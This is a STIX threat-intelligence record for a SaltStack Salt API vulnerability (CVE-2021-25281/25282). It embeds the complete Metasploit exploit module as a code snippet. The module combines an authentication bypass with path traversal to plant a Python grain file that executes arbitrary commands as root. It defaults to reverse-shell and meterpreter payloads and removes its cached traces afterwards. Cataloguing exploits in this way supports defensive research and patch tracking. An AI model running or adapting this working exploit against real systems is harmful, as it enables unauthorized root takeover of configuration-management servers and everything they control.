{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d7a62125-e11e-4c56-9836-6a2486259113",
    "created": "2024-08-14T17:02:07.541795Z",
    "modified": "2024-08-14T17:02:07.541799Z",
    "name": "SaltStack Salt API Unauthenticated RCE through wheel_async client",
    "description": " This module leverages an authentication bypass and directory traversal vulnerabilities in Saltstack Salt's REST API to execute commands remotely on the `master` as the root user.  Every 60 seconds, `salt-master` service performs a maintenance process check that reloads and executes all the `grains` on the `master`, including custom grain modules in the Extension Module directory. So, this module simply creates a Python script at this location and waits for it to be executed. The time interval is set to 60 seconds by default but can be changed in the `master` configuration file with the `loop_interval` option. Note that, if an administrator executes commands locally on the `master`, the maintenance process check will also be performed.  It has been fixed in the following installation packages: 3002.5 3001.6 and 3000.8.  Also, a patch is available for the following versions: 3002.2 3001.4, 3000.6, 2019.2.8, 2019.2.5, 2018.3.5, 2017.7.8, 2016.11.10 2016.11.6, 2016.11.5, 2016.11.3, 2016.3.8, 2016.3.6, 2016.3.4 2015.8.13 and 2015.8.10.  This module has been tested successfully against versions 3001.4 3002 and 3002.2 on Ubuntu 18.04. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/saltstack_salt_wheel_async_rce.rb",
            "external_id": "saltstack_salt_wheel_async_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://saltproject.io/security_announcements/active-saltstack-cve-release-2021-feb-25/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Immersive-Labs-Sec/CVE-2021-25281/blob/main/cve-2021-25281.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SaltStack Salt API Unauthenticated RCE through wheel_async client',\n        'Description' => %q{\n          This module leverages an authentication bypass and directory\n          traversal vulnerabilities in Saltstack Salt's REST API to execute\n          commands remotely on the `master` as the root user.\n\n          Every 60 seconds, `salt-master` service performs a maintenance\n          process check that reloads and executes all the `grains` on the\n          `master`, including custom grain modules in the Extension Module\n          directory. So, this module simply creates a Python script at this\n          location and waits for it to be executed. The time interval is set to\n          60 seconds by default but can be changed in the `master`\n          configuration file with the `loop_interval` option. Note that, if an\n          administrator executes commands locally on the `master`, the\n          maintenance process check will also be performed.\n\n          It has been fixed in the following installation packages: 3002.5,\n          3001.6 and 3000.8.\n\n          Also, a patch is available for the following versions: 3002.2,\n          3001.4, 3000.6, 2019.2.8, 2019.2.5, 2018.3.5, 2017.7.8, 2016.11.10,\n          2016.11.6, 2016.11.5, 2016.11.3, 2016.3.8, 2016.3.6, 2016.3.4,\n          2015.8.13 and 2015.8.10.\n\n          This module has been tested successfully against versions 3001.4,\n          3002 and 3002.2 on Ubuntu 18.04.\n        },\n        'Author' => [\n          'Alex Seymour',           # Original PoC\n          'Christophe De La Fuente' # MSF Module\n        ],\n        'References' => [\n          ['CVE', '2021-25281'], # Auth bypass\n          ['CVE', '2021-25282'], # Directory traversal\n          ['URL', 'https://saltproject.io/security_announcements/active-saltstack-cve-release-2021-feb-25/'],\n          ['URL', 'https://github.com/Immersive-Labs-Sec/CVE-2021-25281/blob/main/cve-2021-25281.py']\n        ],\n        'DisclosureDate' => '2021-02-25',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :bourne,\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DefaultOptions' => {\n          'WfsDelay' => 90, # The master's maintenance process check cycle is set to 60 sec. by default\n          'SSL' => true     # Salt API uses HTTPS by default\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS] # Payload visible in log if set to DEBUG or TRACE level\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_fs_ls\n              stdapi_fs_stat\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(8000),\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new(\n        'EXTMODSDIR',\n        [\n          true,\n          'The Extension Module Directory (\"extmods\")',\n          '/var/cache/salt/master/extmods'\n        ]\n      )\n    ])\n  end\n\n  def check\n    fun = 'config.values'\n    res = send_request(fun: fun)\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    # Server: CherryPy/8.9.1\n    unless res.headers['Server']&.match(%r{^CherryPy/[\\d.]+$})\n      return CheckCode::Unknown('Target does not appear to be running Salt API.')\n    end\n\n    if res.code == 200 && res.get_json_document['return']\n      res_json = res.get_json_document['return'].first\n      if res_json&.key?('tag') && res_json&.key?('jid')\n        return CheckCode::Detected('Salt API responded as expected.')\n      end\n    end\n\n    CheckCode::Safe('Unexpected Salt API response')\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager(background: true)\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    @rand_basename = rand_text_alphanumeric(4..12)\n    path = normalize_uri(datastore['EXTMODSDIR'], 'grains', \"#{@rand_basename}.py\")\n    register_file_for_cleanup(path)\n\n    cmd.gsub!(\"'\", \"\\\\\\\\'\")\n    data = <<~PYTHON\n      import subprocess\n      def #{rand_text_alpha(6..8)}():\n          subprocess.Popen('#{cmd}', shell=True)\n          return {}\n    PYTHON\n\n    send_request(data: data, path: path)\n    vprint_status(\n      \"Waiting up to #{wfs_delay} seconds for the Salt maintenance process check \"\\\n      'to trigger the payload (WfsDelay option).'\n    )\n  end\n\n  def send_request(fun: 'pillar_roots.write', data: '', path: '')\n    # https://docs.saltstack.com/en/latest/ref/netapi/all/salt.netapi.rest_cherrypy.html#post--run\n    json = {\n      'eauth' => 'auto',\n      'client' => 'wheel_async',\n      'fun' => fun\n    }\n    json['data'] = data unless data.empty?\n    json['path'] = \"../../../../../..#{path}\" unless path.empty?\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'run'),\n      'ctype' => 'application/json',\n      'data' => json.to_json\n    )\n  end\n\n  def path_exists?(session, path, is_dir: false)\n    if session.type == 'meterpreter'\n      path_exists = begin\n        session.fs.file.stat(path)\n      rescue StandardError\n        nil\n      end\n      if is_dir\n        return !!(path_exists && path_exists.directory?)\n      else\n        return !!(path_exists && path_exists.file?)\n      end\n    else\n      path_exists = session.shell_command_token(\n        \"test #{is_dir ? '-d' : '-f'} \\\"#{path}\\\" && echo true\"\n      )\n      return !!(path_exists && path_exists =~ /true/)\n    end\n  end\n\n  def on_new_session(session)\n    payload_instance.stop_handler\n    super\n\n    # The Python script is being cached in the \"__pycache__\" directory as a\n    # compiled bytecode file (.pyc). This will need to be deleted to avoid\n    # being executed over and over.\n    path = normalize_uri(datastore['EXTMODSDIR'], 'grains', '__pycache__')\n    if session.type == 'meterpreter'\n      session.core.use('stdapi') unless session.ext.aliases.include?('stdapi')\n      return unless path_exists?(session, path, is_dir: true)\n\n      files = begin\n        session.fs.dir.entries(path, \"#{@rand_basename}*.pyc\")\n      rescue StandardError\n        []\n      end\n\n      files.each do |file|\n        file_path = normalize_uri(path, file)\n        next unless path_exists?(session, file_path)\n\n        session.fs.file.rm(file_path)\n\n        if path_exists?(session, file_path)\n          print_warning(\"Unable to delete #{file_path}\")\n        else\n          print_good(\"Deleted #{file_path}\")\n        end\n      end\n    else\n      return unless path_exists?(session, path, is_dir: true)\n\n      files = session.shell_command_token(\n        \"find \\\"#{path}\\\" -maxdepth 1 -type f -name \\\"#{@rand_basename}*.pyc\\\"\"\n      )\n\n      files.each_line do |file|\n        file.chomp!\n        next unless path_exists?(session, file)\n\n        session.shell_command_token(\"rm -f \\\"#{file}\\\" >/dev/null\")\n\n        if path_exists?(session, file)\n          print_warning(\"Unable to delete #{file}\")\n        else\n          print_good(\"Deleted #{file}\")\n        end\n      end\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-02-25",
    "x_mitre_platforms": [
        "linux'"
    ]
}